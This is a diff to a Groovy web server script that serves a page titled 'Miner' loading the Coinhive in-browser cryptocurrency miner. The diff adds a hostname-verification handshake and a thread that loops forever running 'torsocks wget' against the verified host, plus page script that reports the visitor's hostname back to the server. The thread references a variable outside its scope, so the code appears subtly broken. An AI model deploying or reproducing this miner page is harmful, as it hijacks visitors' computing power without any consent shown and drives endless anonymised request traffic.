@@ -2,17 +2,55 @@
 @GrabResolver(name='jitpack',root='https://jitpack.io')
 import net.freeutils.httpserver.HTTPServer
 
+def hostname
+def verifyPayload=UUID.randomUUID().toString()
+
+def torRequest=new Thread({
+  while(true){
+    "torsocks wget -O /dev/null https://$hn/".execute()
+  }
+})
+torRequest.daemon=false
+
 def server=new HTTPServer(80)
 
 server.getVirtualHost(null).with {
+  addContext('/hostname/notice'){req,resp->
+    if(hostname&&torRequest.alive){
+      resp.sendHeaders(200)
+      return
+    }
+    def hn=req.path.split('/').last()
+    def payload=new URL("https://$hn/hostname/verify").text
+    if(verifyPayload==payload){
+      hostname=hn
+      resp.sendHeaders(200)
+    }else{
+      resp.sendHeaders(404)
+    }
+  }
+  addContext('/hostname/verify'){req,resp->
+    resp.sendHeaders(200)
+    resp.body.write verifyPayload.bytes
+  }
   addContext('/'){req,resp->
-    println 'Requested'
     resp.sendHeaders(200)
     resp.body.write '''
 <!doctype html>
 <html>
 <head>
 <title>Miner</title>
+
+<script>
+var parser = document.createElement('a');
+parser.href = location.href;
+
+var req = new XMLHttpRequest();
+req.onreadystatechange = function() {
+}
+req.open('GET', '/hostname/notice/' + parser.hostname, true);
+req.send(null);
+</script>
 
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
@@ -34,9 +72,6 @@ function addOnLoad(yourFunctionName){
 }
 
 /*
-var parser = document.createElement('a');
-parser.href = location.href
-
 var scptTag=document.createElement('script');
 scptTag.setAttribute('src',
     'https://nao20010128nao.github.io/coin-hive-proxy/client.js?coin-hive-proxy='+parser.hostname);
